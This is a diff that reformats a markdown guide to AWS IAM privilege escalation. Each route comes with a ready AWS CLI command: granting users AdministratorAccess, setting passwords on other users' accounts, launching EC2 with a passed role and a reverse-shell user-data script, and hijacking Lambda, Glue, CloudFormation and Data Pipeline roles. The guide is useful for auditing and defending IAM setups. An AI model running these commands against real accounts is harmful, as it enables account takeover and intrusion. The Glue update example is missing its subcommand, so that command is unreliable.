@@ -19,7 +19,8 @@ IAM policy variables can help here *a lot*. The aws:username and aws:SourceIp va
 Users with the iam:CreatePolicyVersion permission can not only create new versions of existing policies (with whatever permissions they desire), but also replace existing versions of that policy (but *only* if they do so on policy creation). Example:
 
 ```bash
-aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN --policy-document $POLICY_JSON_FILE --set-as-default
+aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN \
+	--policy-document $POLICY_JSON_FILE --set-as-default
 ```
 
 ## Change the Default Version of an Existing Policy
@@ -27,7 +28,8 @@ aws iam create-policy-version --policy-arn $TARGET_POLICY_ARN --policy-document 
 Users with the iam:SetDefaultPolicyVersion permission can roll back (or forward) policies to new versions. Example:
 
 ```bash
-aws iam set-default-policy-version --policy-arn $TARGET_POLICY_ARN --version-id $POLICY_ID_TO_USE
+aws iam set-default-policy-version --policy-arn $TARGET_POLICY_ARN \
+	--version-id $POLICY_ID_TO_USE
 ```
 
 ## Create an EC2 Instance With an Existing Profile
@@ -35,7 +37,10 @@ aws iam set-default-policy-version --policy-arn $TARGET_POLICY_ARN --version-id 
 Users with both iam:PassRole and ec2:RunInstances can spin up a new EC2 instance they have access to using any existing instance profile. The user can then use the AWS keys associated with this instance to gain permission to perform any action the instance can. Example:
 
 ```bash
-aws ec2 run-instances --image-id $IMAGE_ID --instance-type $INSTANCE_TYPE --iam-instance-profile Name=$TARGET_INSTANCE_PROFILE --user-data $REVERSE_SHELL_SCRIPT
+aws ec2 run-instances --image-id $IMAGE_ID \
+	--instance-type $INSTANCE_TYPE \
+	--iam-instance-profile Name=$TARGET_INSTANCE_PROFILE \
+	--user-data $REVERSE_SHELL_SCRIPT
 ```
 
 Note that GuardDuty will trigger if EC2 instance keys are used outside of the instance itself.
@@ -55,7 +60,8 @@ Note that users can have at most two sets of access keys associated with them.
 A user with the iam:CreateLoginProfile permission on *other* users can create a password for users that have not yet logged into the AWS Console, thus assuming their identity. Example:
 
 ```bash
-aws iam create-login-profile --user-name $TARGET_USER --password $NEW_PASSWORD --no-password-reset-required
+aws iam create-login-profile --user-name $TARGET_USER \
+	--password $NEW_PASSWORD --no-password-reset-required
 ```
 
 This is a pretty targeted attack that requires a lot of special conditions, so I'm not sure how much of a risk it really is.
@@ -65,7 +71,8 @@ This is a pretty targeted attack that requires a lot of special conditions, so I
 Same as the above, but allows a user with the iam:UpdateLoginProfile permission on *other* users to assume their identities *after* they've already logged in. Example:
 
 ```bash
-aws iam update-login-profile --user-name $TARGET_USER --password $NEW_PASSWORD --no-password-reset-required
+aws iam update-login-profile --user-name $TARGET_USER \
+	--password $NEW_PASSWORD --no-password-reset-required
 ```
 
 This seems like a more realistic thing to worry about than the last vulnerability.
@@ -75,7 +82,8 @@ This seems like a more realistic thing to worry about than the last vulnerabilit
 The iam:AttachUserPolicy permission allows policies to be attached to *other* users. Including themselves. Example:
 
 ```bash
-aws iam attach-user-policy --user-name $TARGET_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam attach-user-policy --user-name $TARGET_USER \
+	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
 (Sure, an attacker could use any `$POLICY_ARN` here, but why not go for admin if you can get it? Which you can in this situation.)
@@ -85,7 +93,8 @@ aws iam attach-user-policy --user-name $TARGET_USER --policy-arn arn:aws:iam::aw
 The iam:AttachGroupPolicy permission allows for a similar scenario as the above, but for groups rather than users. Example:
 
 ```bash
-aws iam attach-group-policy --group-name $TARGET_GROUP --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam attach-group-policy --group-name $TARGET_GROUP \
+	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
 ## Attach a Policy to a Role
@@ -93,7 +102,8 @@ aws iam attach-group-policy --group-name $TARGET_GROUP --policy-arn arn:aws:iam:
 The iam:AttachRolePolicy permission allows for a scenario like the last two, but for roles. Example:
 
 ```bash
-aws iam attach-role-policy --role-name $TARGET_ROLE --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam attach-role-policy --role-name $TARGET_ROLE \
+	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess
 ```
 
 Note that the attacker needs to control a user who has the sts:AssumeRole permission for that role in order to take advantage of this one.
@@ -103,7 +113,8 @@ Note that the attacker needs to control a user who has the sts:AssumeRole permis
 The iam:PutUserPolicy permission allows an attack like attaching a policy to a user, except that an inline policy is written to that user instead. Example:
 
 ```bash
-aws iam put-user-policy --user-name $TARGET_USER --policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
+aws iam put-user-policy --user-name $TARGET_USER \
+	--policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
 ```
 
 ## Set an Inline Policy for a Group
@@ -111,7 +122,8 @@ aws iam put-user-policy --user-name $TARGET_USER --policy-name $POLICY_NAME --po
 You can guess what the iam:PutGroupPolicy lets you do by this point. Example:
 
 ```bash
-aws iam put-group-policy --group-name $TARGET_GROUP --policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
+aws iam put-group-policy --group-name $TARGET_GROUP \
+	--policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
 ```
 
 ## Set an Inline Policy for a Role
@@ -119,7 +131,8 @@ aws iam put-group-policy --group-name $TARGET_GROUP --policy-name $POLICY_NAME -
 Another obvious one. Requires the iam:PutRolePolicy permission. Example:
 
 ```bash
-aws iam put-role-policy --role-name $TARGET_ROLE --policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
+aws iam put-role-policy --role-name $TARGET_ROLE \
+	--policy-name $POLICY_NAME --policy-document $POLICY_JSON_FILE
 ```
 
 As with other role-based privilege escalation routes, also requires that the user have the sts:AssumeRole permission for `$TARGET_ROLE`.
@@ -129,7 +142,8 @@ As with other role-based privilege escalation routes, also requires that the use
 Add yourself to a privileged group with the iam:AddUserToGroup permission! Example:
 
 ```bash
-aws iam add-user-to-group --group-name $TARGET_GROUP --user-name $TARGET_USER
+aws iam add-user-to-group --group-name $TARGET_GROUP \
+	--user-name $TARGET_USER
 ```
 
 ## Update a Role's AssumeRolePolicyDocument
@@ -137,7 +151,8 @@ aws iam add-user-to-group --group-name $TARGET_GROUP --user-name $TARGET_USER
 A user with *both* the iam:UpdateAssumeRolePolicy and the sts:AssumeRole permission can update the assumer role policy document for any role, allowing them to assume it. Example:
 
 ```bash
-aws iam update-assume-role-policy --role-name $TARGET_ROLE --policy-document $ASSUME_ROLE_POLICY_JSON
+aws iam update-assume-role-policy --role-name $TARGET_ROLE \
+	--policy-document $ASSUME_ROLE_POLICY_JSON
 ```
 
 It seems like this trick really only works if the user's sts:AssumeRole permission is already quite broad.
@@ -168,7 +183,9 @@ This code can then be exploited using two AWS CLI commands:
 ```bash
 # Create the Lambda function
 #
-aws lambda create-function --function-name $FUNCTION_NAME --runtime python3.6 --role $LAMBDA_ROLE_ARN_TO_PASS --handler $FUNCTION_NAME.lambda_handler --code $PATH_TO_PYTHON_CODE
+aws lambda create-function --function-name $FUNCTION_NAME \
+	--runtime python3.6 --role $LAMBDA_ROLE_ARN_TO_PASS \
+	--handler $FUNCTION_NAME.lambda_handler --code $PATH_TO_PYTHON_CODE
 
 # Invoke the Lambda function
 #
@@ -186,7 +203,10 @@ If no suitable DynamoDB table is available, then the dynamodb:CreateTable permis
 Attaching a Lambda function to a DynamoDB table's event stream looks like the following:
 
 ```bash
-aws lambda create-event-source-mapping --function-name $FUNCTION_NAME --event-source-arn $ARN_OF_DYNAMODB_TABLE_STREAM --enabled --starting-position LATEST
+aws lambda create-event-source-mapping \
+	--function-name $FUNCTION_NAME \
+	--event-source-arn $ARN_OF_DYNAMODB_TABLE_STREAM \
+	--enabled --starting-position LATEST
 ```
 
 ## Update an Existing Lambda Function
@@ -194,7 +214,8 @@ aws lambda create-event-source-mapping --function-name $FUNCTION_NAME --event-so
 An attacker with the lambda:UpdateFunctionCode permission can update an existing Lambda function, effectively gaining the permissions of whatever IAM role is attached to it. Example:
 
 ```bash
-aws lambda update-function-code --function-name $TARGET_FUNCTION --zip-file $ZIP_FILE_WITH_LAMBDA_CODE
+aws lambda update-function-code --function-name $TARGET_FUNCTION \
+	--zip-file $ZIP_FILE_WITH_LAMBDA_CODE
 ```
 
 (A zip file is used here on the assumption that an existing Lambda function is probably a lot more complex than the short code snippet presented previously. But that could also be used instead.)
@@ -204,7 +225,8 @@ aws lambda update-function-code --function-name $TARGET_FUNCTION --zip-file $ZIP
 The combination of the iam:PassRole and glue:CreateDevEndpoint permissions creates a situation that is virtually identical to the EC2 instance attack described near the beginning. The only real difference is that an SSH key *must* be used here, but it can conveniently be specified at the command line (rather than having to be uploaded separately into AWS). Example:
 
 ```bash
-aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME --role-arn $ROLE_ARN_TO_PASS --public-key $PATH_TO_SSH_PUBLIC_KEY
+aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME \
+	--role-arn $ROLE_ARN_TO_PASS --public-key $PATH_TO_SSH_PUBLIC_KEY
 ```
 
 ## Update an Existing Glue Dev Endpoint
@@ -212,7 +234,8 @@ aws glue create-dev-endpoint --endpoint-name $ENDPOINT_NAME --role-arn $ROLE_ARN
 This one just needs the glue:UpdateDevEndpoint permission. With this, an attacker can update the SSH key associated with an existing Glue endpoint, gaining access to the system (and hence its associated role). Example:
 
 ```bash
-aws glue --endpoint-name $TARGET_ENDPOINT --public-key $PATH_TO_SSH_PUBLIC_KEY
+aws glue --endpoint-name $TARGET_ENDPOINT \
+	--public-key $PATH_TO_SSH_PUBLIC_KEY
 ```
 
 ## Pass a Role to CloudFormation
@@ -220,7 +243,8 @@ aws glue --endpoint-name $TARGET_ENDPOINT --public-key $PATH_TO_SSH_PUBLIC_KEY
 This one needs the combination of iam:PassRole and cloudformation:CreateStack. It's basically like the EC2 and Glue attacks, except because CloudFormation is an automation service, there's really no need for the attacker to log in - the template file can direct the created AWS resources to perform whatever actions the attacker wishes (and the passed in role allows). Example:
 
 ```bash
-aws cloudformation create-stack --stack-name $STACK_NAME --template-url $TEMPLATE_URL --role-arn $ROLE_ARN_TO_PASS
+aws cloudformation create-stack --stack-name $STACK_NAME \
+	--template-url $TEMPLATE_URL --role-arn $ROLE_ARN_TO_PASS
 ```
 
 Note that the `$TEMPLATE_URL` can be hosted *anywhere*.
@@ -236,5 +260,6 @@ aws datapipeline create-pipeline --name $PIPELINE_NAME --unique-id $UUID
 
 # Add a malicious action to the pipeline
 #
-aws datapipeline put-pipeline-definition --pipeline-id $UUID --pipeline-definition $PATH_TO_MALICIOUS_PIPELINE_DEFINITION_JSON
+aws datapipeline put-pipeline-definition --pipeline-id $UUID \
+	--pipeline-definition $PATH_TO_MALICIOUS_PIPELINE_DEFINITION_JSON
 ```
